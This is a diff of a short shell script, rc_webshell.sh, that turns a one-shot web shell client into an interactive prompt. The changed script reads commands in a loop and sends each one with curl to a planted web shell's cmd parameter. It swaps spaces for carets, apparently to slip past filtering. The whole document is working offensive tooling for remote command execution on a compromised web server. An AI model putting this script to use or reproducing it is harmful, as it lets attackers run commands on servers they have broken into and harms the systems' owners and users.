@@ -3,16 +3,21 @@
 # author: Nullable
 
 usage() {
-	echo "\nUsage: rc_webshell.sh <url_to_webshell> <command>"
+	echo "\nUsage: rc_webshell.sh <url_to_webshell>"
 	exit
 }
 
 main() {
-	if test $# -ne 2; then
+	if test $# -ne 1; then
 		usage
 	fi
 	
-	echo $(curl "$1?cmd=$2")
+	while true; do
+		echo -n "$ "
+		read command
+		command=$(echo $command | tr " " "^")
+		echo $(curl -s "$1?cmd=$command")
+	done
 }
 
 main $@
